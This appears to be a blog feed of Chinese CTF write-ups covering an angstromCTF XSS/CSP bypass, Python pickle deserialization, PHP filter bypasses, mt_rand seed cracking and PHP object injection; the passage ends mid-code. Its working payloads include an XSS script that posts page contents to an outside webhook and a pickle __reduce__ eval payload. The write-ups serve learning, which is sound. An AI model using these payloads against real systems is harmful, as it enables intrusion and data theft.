    <content type="html"><![CDATA[<h3 id="2021angstromCTF-nomnomnom"><a href="#2021angstromCTF-nomnomnom" class="headerlink" title="2021angstromCTF-nomnomnom"></a>2021angstromCTF-nomnomnom</h3><p><a href="https://2021.angstromctf.com/challenges">https://2021.angstromctf.com/challenges</a></p><p><img src="/images/2021angstromCTF-nomnomnom/image-20210411220237452.png" alt="image-20210411220237452"></p><p>一个小游戏，会记录分数，会在一个页面生成你的分数，记录展示用户名和分数</p><p>其中用户名这部分是可以控制的，产生了xss漏洞：</p><p><img src="/images/2021angstromCTF-nomnomnom/image-20210411233254290.png" alt="image-20210411233254290"></p><p>这里注入了标签：&lt;marquee&gt;&lt;/marquee&gt;，对页面产生了影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> res.send(`</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&#x27;Content-Security-Policy&#x27;</span> content=<span class="string">&quot;script-src &#x27;nonce-$&#123;nonce&#125;&#x27;&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;snek nomnomnom&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">$&#123;extra&#125;$&#123;extra ? <span class="string">&#x27;&lt;br /&gt;&lt;br /&gt;&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">&lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt;</span><br><span class="line">Check out this score of $&#123;score&#125;! &lt;br /&gt;</span><br><span class="line">&lt;a href=<span class="string">&#x27;/&#x27;</span>&gt;Play!&lt;/a&gt; &lt;button id=<span class="string">&#x27;reporter&#x27;</span>&gt;Report.&lt;/button&gt; &lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">This score was set by $&#123;name&#125;</span><br><span class="line">&lt;script nonce=<span class="string">&#x27;$&#123;nonce&#125;&#x27;</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">fetch(<span class="string">&#x27;/report/$&#123;req.params.shareName&#125;&#x27;</span>, &#123;</span><br><span class="line">method: <span class="string">&#x27;POST&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.getElementById(<span class="string">&#x27;reporter&#x27;</span>).onclick = () =&gt; &#123; report() &#125;;</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是源码部分，采取了**CSP (Content Security Policy)**来防止xss注入，为了绕过csp，这里需要用到：</p><h3 id="Dangling-Markup"><a href="#Dangling-Markup" class="headerlink" title="Dangling Markup"></a>Dangling Markup</h3><p><a href="https://blog.csdn.net/angry_program/article/details/106441323">https://blog.csdn.net/angry_program/article/details/106441323</a></p><p>html在读取标签时，<code>&lt;</code>会一直匹配到下一个<code>&gt;</code>为止，利用这个特性，我们可以使注入点下的nonce属性成为我们脚本标签中的属性从而绕过csp，不过此漏洞似乎有版本限制……。</p><p><img src="/images/2021angstromCTF-nomnomnom/image-20210411234524590.png" alt="image-20210411234524590"></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;data:text/javascript, fetch(&#x27;webhookurl&#x27;, &#123;method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: document.body.innerText&#125;)&quot;</span></span><br></pre></td></tr></table></figure><p>这里用到<a href="https://webhook.site/%E6%8F%90%E4%BE%9B%E7%9A%84xss%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%AE%A9%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC%E6%97%B6%E5%8E%BB%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5%E5%8D%B3%E5%8F%AF">https://webhook.site/提供的xss平台，让网页加载脚本时去访问网页即可</a></p><p>不过大佬好像还进行了一步：</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    fetch(<span class="string">&#x27;/report/f8f9270fe102e65a&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;POST&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://smerren.io/assets/images/report.PNG" alt="img"></p></blockquote><p>js……不是很会，在学了在学了</p><p>大概是通过fetch再次请求资源……？</p><p>我去找了源码，结果是用Node.js的Express框架写的……</p><p>/report路由是post方法，只有几步处理……</p><p>看得不是很懂，让我学一波相关语言再审计吧……</p><p>xss平台：</p><img src="/images/2021angstromCTF-nomnomnom/image-20210411235253988.png" alt="image-20210411235253988" style="zoom:50%;" /><p>赋值了cookie，源码中有检测cookie的操作，这可能就是为什么要在这个页面请求两次？</p><p>webhook：</p><p>第一次：</p><img src="/images/2021angstromCTF-nomnomnom/image-20210411235441294.png" alt="image-20210411235441294" style="zoom:80%;" /><p>第二次：</p><p><img src="/images/2021angstromCTF-nomnomnom/image-20210411235452273.png" alt="image-20210411235452273"></p><p>响应信息里出现了flag！</p><p>以后学习一些知识再回来完善完善……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;2021angstromCTF-nomnomnom&quot;&gt;&lt;a href=&quot;#2021angstromCTF-nomnomnom&quot; class=&quot;headerlink&quot; title=&quot;2021angstromCTF-nomnomnom&quot;&gt;&lt;/a&gt;2021angstro</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021ångstromCTF-Jar</title>
    <link href="http://example.com/2021/04/11/2021angstromCTF-Jar/"/>
    <id>http://example.com/2021/04/11/2021angstromCTF-Jar/</id>
    <published>2021-04-11T13:48:27.000Z</published>
    <updated>2021-04-11T13:58:46.432Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2021angstromCTF-Jar"><a href="#2021angstromCTF-Jar" class="headerlink" title="2021ångstromCTF-Jar"></a>2021ångstromCTF-Jar</h3><p><a href="https://2021.angstromctf.com/challenges">https://2021.angstromctf.com/challenges</a></p><p>做了一道外国赛题……</p><p>记得做ikun题的时候好像接触过jar(泡菜，python反序列化</p><blockquote><p>不过ikun好难，回来再做做</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;actf&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/pickle.jpg&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span>():</span></span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">&#x27;pickle.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;&#x27;</span> + \</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;&quot;&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;&#x27;</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/add&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line">items.append(request.form[<span class="string">&#x27;item&#x27;</span>])</span><br><span class="line">response = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">response.set_cookie(<span class="string">&#x27;contents&#x27;</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接给出了源码，直接对对象进行了反序列化，而python中的反序列化是很危险的，利用__reduce__方法，可以在反序列化时使程序执行我们构造的代码：</p><blockquote><p>上面：flag = os.environ.get(‘FLAG’, ‘actf{FAKE_FLAG}’)</p><p>甚至为我们构造好了语句……</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class test(object):</span><br><span class="line">    def __reduce__(<span class="built_in">self</span>):</span><br><span class="line">         <span class="keyword">return</span> (<span class="keyword">eval</span>, (<span class="string">&quot;os.environ.get(&#x27;FLAG&#x27;, &#x27;actf&#123;FAKE_FLAG&#125;&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">c=pickle.dumps(test())</span><br><span class="line">d=base64.b64encode(c)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><img src="/images/2021angstromCTF-Jar/image-20210411215740361.png" alt="image-20210411215740361" style="zoom:50%;" /><p>找到首尾相连的字母，获取flag……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;2021angstromCTF-Jar&quot;&gt;&lt;a href=&quot;#2021angstromCTF-Jar&quot; class=&quot;headerlink&quot; title=&quot;2021ångstromCTF-Jar&quot;&gt;&lt;/a&gt;2021ångstromCTF-Jar&lt;/h3&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020-套娃</title>
    <link href="http://example.com/2021/04/11/MRCTF2020-%E5%A5%97%E5%A8%83/"/>
    <id>http://example.com/2021/04/11/MRCTF2020-%E5%A5%97%E5%A8%83/</id>
    <published>2021-04-11T13:10:45.000Z</published>
    <updated>2021-04-11T13:23:07.703Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="MRCTF2020-套娃"></a>MRCTF2020-套娃</h3><p>进入页面，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>了解一下QUERY_STRING：<a href="https://www.cnblogs.com/mitang/p/3874291.html">https://www.cnblogs.com/mitang/p/3874291.html</a></p><p>这个东西不会对字段进行url转码，可以通过urlencode绕过……</p><p>/^23333$/考察<strong>换行符</strong>绕过（话说今年也有</p><blockquote><p>?b%20u%20p%20t=23333%0a</p></blockquote><p>提示有secrettw.php，源码有jsfxxk，解密alert一个<code>post me Merak</code></p><p>出现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file_get_contents用data传参，ip用head头client-ip绕过</p><p>根据change函数逆向出payload即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;MRCTF2020-套娃&quot;&gt;&lt;a href=&quot;#MRCTF2020-套娃&quot; class=&quot;headerlink&quot; title=&quot;MRCTF2020-套娃&quot;&gt;&lt;/a&gt;MRCTF2020-套娃&lt;/h3&gt;&lt;p&gt;进入页面，查看源码：&lt;/p&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>枯燥的抽奖</title>
    <link href="http://example.com/2021/04/11/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
    <id>http://example.com/2021/04/11/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</id>
    <published>2021-04-11T12:47:44.000Z</published>
    <updated>2021-04-11T13:06:50.389Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411205041425.png" alt="image-20210411205041425"></p><p>提交一个数字，network里发现提交给了check.php，访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>在session中随机生成一个种子，如果种子确定，则后来生成的随机数也是确定的……</p><p>更改session，相同的session出现的字符串前十位不变</p><p>生成的字符串由种子确定的随机数确定，我们要从已有的几组数据中爆破出种子</p><blockquote><p><em>本来想用php写个脚本，发现这个想法不现实，性能拉跨……</em></p></blockquote><p><strong>php_mt_seed-4.0</strong>工具可以帮助我们完成破解，但首先我们要还原数据为合法的格式</p><blockquote><p><strong>一个参数</strong></p><p>当只有一个参数的时候，这个参数代表mt_rand第一次输出的值。</p><p><strong>两个参数</strong></p><p>当有两个参数的时候，他们代表mt_rand第一次输出应该位于什么区间内。</p><p>第一个参数为最小值，第二个参数为最大值。</p><p><strong>四个参数</strong></p><p>前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。</p><p><strong>多于五个参数</strong></p><p>每四个参数一组，但是最后一组可以是1，2或4个参数。每一组引用对应的输出。</p></blockquote><p>还原脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j in range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411210432842.png" alt="image-20210411210432842"></p><p>第一次输出的区间：固定相同的两个数</p><p>mt_rand输出的区间：只能是0-61</p><p>放到php_mt_seed里：</p><p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411210619599.png" alt="image-20210411210619599"></p><p>得到seed，再根据seed找到完整字符串即可~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;GWCTF-2019-枯燥的抽奖&quot;&gt;&lt;a href=&quot;#GWCTF-2019-枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]枯燥的抽奖&quot;&gt;&lt;/a&gt;[GWCTF 2019]枯燥的抽奖&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezpop_Revenge</title>
    <link href="http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/"/>
    <id>http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/</id>
    <published>2021-04-04T08:54:24.000Z</published>
    <updated>2021-04-04T12:01:03.049Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>做了ezpop，看到这道题，就想尝试一下，结果……无语凝噎</p><p>进入题目，是一个搭建的博客，扫出<a href="http://www.zip网站源码：">www.zip网站源码：</a></p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404165801705.png" alt="image-20210404165801705" style="zoom:80%;" /><blockquote><p>（非常恐怖</p></blockquote><p>这里有很多网页的代码，既然是Revenge，应该是反序列化题目，在文件内查找：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里可以反序列化了一个post的数据，并且做了过滤……不管如何利用，先从这里找，在这个文件上方有一个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wakeup的魔法方法，可以反序列化调用，跟进Typecho_Db：</p><p>（代码太多，这里选择有用的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 